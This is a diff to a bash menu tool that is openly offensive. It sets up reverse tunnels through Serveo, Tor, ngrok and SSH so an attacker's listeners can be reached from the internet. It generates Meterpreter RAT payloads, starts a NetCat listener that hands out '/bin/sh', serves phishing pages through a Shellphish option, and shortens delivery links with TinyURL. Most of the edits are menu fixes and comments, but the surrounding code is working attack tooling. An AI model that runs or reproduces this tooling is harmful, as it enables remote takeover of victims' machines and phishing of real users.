@@ -8,7 +8,7 @@
 # Current shells supported are RAW, NetCat, and Metasploit/Meterpreter
 # Current GUI shells supported are VNC and NoMachine
 
-trap 'printf "\n";stop;exit 1' 2
+trap 'printf "\n"; stop 1; exit 1' 2
 clear
 OSType=""
 
@@ -26,11 +26,13 @@ startmenu() {
 	printf "  Run Meterpreter reverse tunnels                            = 20\n"
 	printf "  Run Shellphish @thelinuxchoice                             = 30\n"
 	printf "  Check Dependencies                                         = 90\n"
-	printf "  Exit                                                       = 99\n"
+	printf "  Exit and clean/stop up tunnels and services or CTRL+C      = 98\n"
+	printf "  Exit and keep services running                             = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	case $option in
-		99) 	stop 1 ;;
+		98) 	stop 1 ;;
+		99) 	exit ;;
 		1|01) 	banner
 			printf "\e[92m  SSH tunneling...\n"
 			printf "  SSH Tunneling -L (local proxy to SSH server local address)  =  1\n"
@@ -146,11 +148,8 @@ menuserveo() {
 	banner
 	printf "\e[92m  Serveo.net...\n"
 	menussh
-
-	if [[ $option == 99 ]]; then 
-		startmenu
-	fi
 	case $option in
+		99) 	startmenu ;;
 		1|01)   lip; rip
 			printf "\e[1;93m [!] Reverse tunnel from $rserver:$rport to localhost:$lport\e[0m\n"
 			serveoitforward $lport $rserver $rport
@@ -203,10 +202,8 @@ menutor() {
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	printf "\n"
-	if [[ $option == 99 ]]; then 
-		startmenu
-	fi
 	case $option in
+		99) 	startmenu ;;
 		1|01) 	lip; toritforward $lport; menutor ;;
 		2|02) 	lip; toritforward $lport; printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
@@ -339,10 +336,8 @@ menupayloads() {
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
-	if [[ $option == 99 ]]; then 
-		startmenu
-	fi
 	case $option in
+		99) 	startmenu ;;
 		11) 	payload="windows/meterpreter/reverse_tcp"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
@@ -490,6 +485,7 @@ menupayloads() {
 }
 
 lip() {
+#	Request local ip listening port
 	default_port="12345"
 	printf '\e[92m  Choose a local listening port (Example:12345): ' $default_server
 	read lport
@@ -497,6 +493,7 @@ lip() {
 }
 
 rip() {
+#	Request remote server info
 	default_rserver="serveo.net"
 	default_rport="12345"
 	printf '\e[92m  Choose a remote server to recieve from (Example:'$default_rserver')\e[37;1m: '
@@ -508,6 +505,7 @@ rip() {
 }
 
 rfip() {
+#	Request remote server to forward traffic to through pivot
 	default_rrserver="towel.blinkenlights.nl"
 	default_rrport="23"
 	printf '\e[92m  Choose a remote server to forward/pivot to (Example:'$default_rrserver')\e[37;1m: ' $default_rrserver
@@ -519,6 +517,7 @@ rfip() {
 }
 
 MetasploitMe() {
+#	$1=local IP; $2=remote server; $3=remote IP; $4=payload; $5=filetype $6=file extention (localhost or remote IP)
 	read -p $'\e[92mChoose RAT name with ".'$fileext'" extention: ' pname
 	printf "\e[1;93m [!] Starting Metasploit Meterpreter ($OSType) listener on port "$1"!\e[0m\n"
 	rm -rf reverse-connect.sh
@@ -539,6 +538,7 @@ MetasploitMe() {
 }
 
 nomachineme() {
+#	Download NoMaching
 	if [[ -f nomachine_6.3.6_1_amd64.deb ]]; then
 		printf ""
 	else
@@ -549,6 +549,7 @@ nomachineme() {
 
 sshme () {
 #	add username to server if needed.  Example: "user@serverip"
+#	$1=local IP; $2=remote server; $3=remote IP; $4=parameters for SSH; $5=pivot IP (localhost or remote IP)
 	sshconnect="ssh -o StrictHostKeyChecking=no -o CheckHostIP=no $4 $1:$5:$3 $2"
 	printf $sshconnect
 	$sshconnect
@@ -557,6 +558,7 @@ sshme () {
 }
 
 ngrokme() {
+#	Download Ngrok
 	if [[ -e ngrok ]]; then
 		printf "Installed...\n"
 	else
@@ -574,7 +576,8 @@ ngrokme() {
 }
 
 torview() {
-	# Installing Tor browser
+#	$1=local IP; $2=hostname.onion
+# 	Installing Tor browser and testing
 	toruser=`cat /etc/passwd | grep -i "kalitor:" | cut -d ":" -f 1`
 	if [[ $toruser == "kalitor" ]]; then
 		printf "\e[1;93m  User already configured...\n"
@@ -593,6 +596,7 @@ torview() {
 		curdir=$(pwd)
 		sudo -u kalitor -H tar -xvJf tor-browser-linux64-8.0.3_en-US.tar.xz -C /home/kalitor/
 	fi
+
 	timex
 	checkphp=$(ps aux | grep -o "php" | head -n1)
 	if [[ ! -z "$2" && $checkphp == *'php'* && ! -z "$1" ]]; then
@@ -611,6 +615,7 @@ torview() {
 }
 
 timex() {
+# Simple timer
 	tortimex=0
 	printf "  Resolving Tor Network... "
 	while [ $tortimex != 30 ]
@@ -623,19 +628,20 @@ timex() {
 }
 
 waitforit() {
+#	Just... wait for it...
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
 }
 
 tordeview() {
-	# Kill user & Un-Installing Tor browser
+# 	Kill user & Un-Installing Tor browser
 	killall -u kalitor
 	deluser kalitor	
 	rm -rf /home/kalitor
-	# bleachbit -c --preset
 }
 
 toritforward() {
+#	$1=local IP
 	# Reverse tunneling with Tor.  You run the server locally.  We just add the config
 	killall tor > /dev/null 2>&1 
 	aa-complain system_tor
@@ -691,6 +697,7 @@ toritforward() {
 }
 
 ngrokitforward() {
+#	$1=local IP
 	printf "\e[92mStarting NGROK tunnel...\e[0m\n"
 	./ngrok tcp $1 > /dev/null 2>&1 &
 	sleep 5
@@ -716,16 +723,19 @@ ngrokitforward() {
 }
 
 socatitforward() {
+#	$1=local IP; $2=remote server; $3=remote IP
 	socat tcp-listen:$1,reuseaddr,fork TCP:$2:$3 &
 }
 
 servessh() {
+#	$1=local IP; $2=remote server; $3=remote IP
 	printf "\e[92mStarting tunnel...\e[0m\n"
 	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $3:localhost:$1 $2
 	waitforit
 }
 
 serveoitforward() {
+#	$1=local IP; $2=remote server; $3=remote IP
 	if  [[ ! -z "$OSType" ]]; then
 		MetasploitMe $1 $2 $3
 	fi
@@ -745,6 +755,7 @@ serveoitforward() {
 }
 
 serveserveo() {
+#	$1=local IP
 	$httpserver $1
 	if [[ -e sendlink ]]; then
 		rm -rf sendlink
@@ -761,6 +772,7 @@ serveserveo() {
 }
 
 servephp() {
+#	$1=local IP
 	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local PHP HTTP server on port \e[97m\e[5m$1 \e[25m...\n"
 	mkdir PHPHTTP > /dev/null 2>&1 &
 	cp -r site/*.* PHPHTTP/
@@ -769,6 +781,7 @@ servephp() {
 }
 
 servepython() {
+#	$1=local IP
 	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local Python HTTP server on port \e[97m\e[5m$1 \e[25m...\n"
 	mkdir PythonHTTP > /dev/null 2>&1 &
 	cp -r site/installs/*.* PythonHTTP/
@@ -777,6 +790,7 @@ servepython() {
 }
 
 servengrok() {
+#	$1=local IP
 	ngrokme
 	$httpserver $1
 	printf "\e[1;92m[\e[0m*\e[1;92m]Starting ngrok server...\n"
@@ -791,6 +805,7 @@ servengrok() {
 }
 
 servetor() {
+#	$1=local IP
 	printf "\e[1;93m"
 	aa-complain system_tor
 	systemctl restart apparmor
@@ -839,12 +854,14 @@ servetor() {
 }
 
 tinyurl () {
+#	$1=URL to convert
 	tiny=$(curl -s http://tinyurl.com/api-create.php?url=$1 | head -n1)
 	printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $tiny
 	printf "\n"
 }
 
 stop() {
+# 	Cleaning up your mess
 	printf "\nCleaning up services\n"
 	checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 	checkphp=$(ps aux | grep -o "php" | head -n1)
@@ -873,7 +890,6 @@ stop() {
 	rm -rf reverse*connect.sh > /dev/null 2>&1
 	rm -rf testme.sh > /dev/null 2>&1
 	rm -rf sendlink > /dev/null 2>&1
-	exit 1
 }
 	
 banner() {
